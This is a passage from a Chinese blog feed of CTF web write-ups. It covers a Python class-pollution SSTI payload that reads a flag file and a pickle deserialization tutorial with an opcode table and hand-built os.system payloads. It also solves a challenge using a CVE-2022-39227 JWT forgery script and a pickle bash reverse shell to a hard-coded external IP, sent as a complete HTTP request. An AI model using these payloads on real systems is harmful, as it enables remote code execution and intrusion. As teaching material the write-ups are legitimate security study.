/etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="法三-污染requests模块的respone"><a href="#法三-污染requests模块的respone" class="headerlink" title="法三(污染requests模块的respone)"></a>法三(污染requests模块的respone)</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;requests&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Swagger-docs&quot;&gt;&lt;a href=&quot;#Swagger-docs&quot; class=&quot;headerlink&quot; title=&quot;Swagger docs&quot;&gt;&lt;/a&gt;Swagger docs&lt;/h1&gt;&lt;p&gt;一进去是一个文档内容, 还以为是容器没弄好&lt;/p&gt;
&lt;p&gt;仔</summary>
      
    
    
    
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="Flask审计" scheme="http://example.com/tags/Flask%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Python原型链污染(类污染)" scheme="http://example.com/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>pickle反序列化</title>
    <link href="http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-02-28T08:10:51.000Z</published>
    <updated>2024-02-29T08:16:43.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>在pyhton中也存在序列化和反序列化的操作, 由pickle模块实现</p><p>与php中的<code>serialize()</code>和<code>unserialize()</code>相对应,在python中为<code>pickle.dump()</code>和<code>pickle.load()</code></p><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;nacl&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(data, f) <span class="comment"># 序列化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f)) <span class="comment"># 反序列化</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment"># b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00\x8c\rhello, world!\x94.&#x27;</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br></pre></td></tr></table></figure><blockquote><p>pickle.load()用于从文件中加载序列化的对象</p><p>pickle.load()从字节流中加载序列化的对象</p><p>pickle.dump()将序列化的二进制数据保存到文件</p><p>pickle.dumps()直接返回序列化后的二进制流</p></blockquote><h2 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__方法"></a><code>__reduce__</code>方法</h2><blockquote><p><code>__reduce__</code><br>调用:被定义之后，当对象被pickle时就会触发<br>作用:如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle<br>    如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用</p></blockquote><p>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">s = a() </span><br><span class="line">payload = pickle.dumps(s)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p><strong>注: pickle反序列化后执行函数时会自动尝试导入未导入的模块, 所以即便网站应用并没有import os 也可以执行成功</strong></p><p>此时whoami会被执行,达到目的,</p><p>当然也可以通过os.system来执行命令反弹shell</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcode就是序列化后的结果, 实际上它是将对象等实例化为某种指令集的结果, 依靠PVM来解析</p><p>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</p><p>由于其向前兼容的特性, 我们可以手动编写opcode指令, 反序列化即可执行恶意脚本</p><h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>PVM由以下三部分组成</p><ul><li>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。</li><li>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象。</li><li>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储。</li></ul><h2 id="常用的opcode"><a href="#常用的opcode" class="headerlink" title="常用的opcode"></a>常用的opcode</h2><table><thead><tr><th align="left">指令</th><th align="left">描述</th><th align="left">具体写法</th><th align="left">栈上的变化</th></tr></thead><tbody><tr><td align="left">c</td><td align="left">获取一个全局对象或import一个模块</td><td align="left">c[module]\n[instance]\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">o</td><td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="left">o</td><td align="left">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="left">i</td><td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="left">i[module]\n[callable]\n</td><td align="left">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="left">N</td><td align="left">实例化一个None</td><td align="left">N</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">S</td><td align="left">实例化一个字符串对象</td><td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">V</td><td align="left">实例化一个UNICODE字符串对象</td><td align="left">Vxxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">I</td><td align="left">实例化一个int对象</td><td align="left">Ixxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">F</td><td align="left">实例化一个float对象</td><td align="left">Fx.x\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">R</td><td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="left">R</td><td align="left">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="left">.</td><td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="left">.</td><td align="left">无</td></tr><tr><td align="left">(</td><td align="left">向栈中压入一个MARK标记</td><td align="left">(</td><td align="left">MARK标记入栈</td></tr><tr><td align="left">t</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="left">t</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">)</td><td align="left">向栈中直接压入一个空元组</td><td align="left">)</td><td align="left">空元组入栈</td></tr><tr><td align="left">l</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="left">l</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">]</td><td align="left">向栈中直接压入一个空列表</td><td align="left">]</td><td align="left">空列表入栈</td></tr><tr><td align="left">d</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="left">d</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">}</td><td align="left">向栈中直接压入一个空字典</td><td align="left">}</td><td align="left">空字典入栈</td></tr><tr><td align="left">p</td><td align="left">将栈顶对象储存至memo_n</td><td align="left">pn\n</td><td align="left">无</td></tr><tr><td align="left">g</td><td align="left">将memo_n的对象压栈</td><td align="left">gn\n</td><td align="left">对象被压栈</td></tr><tr><td align="left">0</td><td align="left">丢弃栈顶对象</td><td align="left">0</td><td align="left">栈顶对象被丢弃</td></tr><tr><td align="left">b</td><td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="left">b</td><td align="left">栈上第一个元素出栈</td></tr><tr><td align="left">s</td><td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="left">s</td><td align="left">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="left">u</td><td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="left">u</td><td align="left">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="left">a</td><td align="left">将栈的第一个元素append到第二个元素(列表)中</td><td align="left">a</td><td align="left">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="left">e</td><td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="left">e</td><td align="left">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><h2 id="函数执行opcode构造"><a href="#函数执行opcode构造" class="headerlink" title="函数执行opcode构造"></a>函数执行opcode构造</h2><p><code>R</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos      # 使用c来import os模块</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;   # (压入mark标记   S实例化一个字符串对象</span><br><span class="line">tR.&#x27;&#x27;&#x27; # 寻找上一个mark标记并将之间的数据合并为一个元组 即(&#x27;whoami&#x27;,)</span><br><span class="line"> # R选择第一个对象为函数,第二个对象为参数 即os.system(&#x27;whoami&#x27;,)</span><br></pre></td></tr></table></figure><p><code>o</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos  # 使用c来import os模块</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27; # S实例化一个字符串对象</span><br><span class="line">o.&#x27;&#x27;&#x27;  # o寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）即 os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p><code>i</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;  # (压入mark标记   S实例化一个字符串对象</span><br><span class="line">ios# i相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>下面搬运两张PVM解析opcode的动图演示</p><ul><li>PVM解析 <code>str</code> 的过程</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230631-6204866e-6abc-1.gif"></p><ul><li>PVM解析 <code>__reduce__()</code> 的过程</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230711-7972c0ea-6abc-1.gif"></p><h2 id="Pker工具"><a href="#Pker工具" class="headerlink" title="Pker工具"></a>Pker工具</h2><p><a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><p>使用脚本来生成我们需要的opcode</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例:"></a>案例:</h2><h3 id="New-star-2023-Ye’s-Pickle"><a href="#New-star-2023-Ye’s-Pickle" class="headerlink" title="New star 2023 Ye’s Pickle"></a>New star 2023 Ye’s Pickle</h3><p>题目给出了附件</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># 包含字母和数字</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>一开始会返回一个jwt token 这里涉及到一个cve的利用</p><p>CVE-2022-39227</p><p>直接用网上的利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    <span class="built_in">print</span>(parsed_payload)</span><br><span class="line">    parsed_payload[<span class="string">&quot;role&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="built_in">print</span>(fake_payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(topic(<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA5MjEsImlhdCI6MTcwOTEzNzMyMSwianRpIjoic0t1bEt5Q0VJSXFORDN2R3pKeGVqdyIsIm5iZiI6MTcwOTEzNzMyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.OfLoye4xwPW_8a7iakPPOXc9ki4EcbfTMG4Swm0Bo_9p6Wv5ZM0hGimwUKgweMNEsnUl6xXi47QIEaUSc2tS2CIchYHJs3quH0odaQoxlulyE3IOYh0-NzQfTymeqsmbejweyEQ1FiRjKyBgVNFL7eZa8ESp_2CIzeYmCmaaTjDfwVhgm7O6wTfwVoX4qjtPitQ-NWaSQ3lwQtXyveOGx3mqWiWY2d_STalqDv3bnUNyOkxXywkOpYM-OtVzY48lTD7m3BQTHLQ93C_3QYOHk_KzMDitnsekdC3gw3eDYdiVq8BruDgXrKHK7lxVBvvVFRv-NIwoO-E7wK1ukzC0gg&#x27;</span>))</span><br></pre></td></tr></table></figure><p>将结果作为参数token的值,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token=&#123;&quot; eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;, &quot;payload&quot;:&quot;eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9&quot;,&quot;signature&quot;:&quot;OXsPZvXsGqKReQFv9FMYwneKop1D757MA1WmPG4IsOze9An4tQtDGu3zycahr6EL0Xn-rcToH0hGyH4i9dt3jnWPxNTrqR1QRIclAOeGinN9wBnxyECNZf8_0gBGhazgvSdB2lHwLsuVoR2mSMndPhCMz9oJPATVqmpfhveYiT9N7uGTUJbbrXXaEF3BPU2T0vOChhDmqZGUw93qy5lIkxMhnSa6plSPovDdBv1aUKmWoGmy_TRAkFesL1NKjv7Wi0QjdcUge96Fv3mmqMp9_G-iafz7u9Ot-YyJ9VsOGqi_vBov6fTFZnJSzAwv49DgIeuVxa2sKtzR8970nk_owg&quot;&#125;</span><br></pre></td></tr></table></figure><p>会返回一个session, 就是admin的session</p><p>此时就可以取pickle这个路由下进行pickle</p><p>这里不会回显, 因此需要使用opcode构造一个反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/107.148.75.202/1234 0&gt;&amp;1\&quot;&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64encode(opcode)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>b’Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg&#x3D;&#x3D;’</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pickle?pickle=Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg==</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>300e864c-da01-4bab-9750-6b5949530b2c.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJyb2xlIjoiYWRtaW4ifQ.Zd9egg.OdEGNtZQIeC9-nt3MzZmcX_uDRY</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229004733728.png" alt="image-20240229004733728"></p><p>得到flag</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>进去后可以注册登录, 这些地方都测不出什么漏洞</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229133317018.png" alt="image-20240229133317018"></p><p>看了半天, 这里要求买到lv6, 翻了几页都没有lv6, 在static&#x2F;img目录下lv6.png确实存在. 这里需要用python脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://e1b204f5-1beb-46b5-bf6b-9362c6510dfe.node5.buuoj.cn:81/shop?page=&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url=url.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">   <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到lv6.png在page&#x3D;181</p><p>之后是修改折扣信息来购买</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160429059.png" 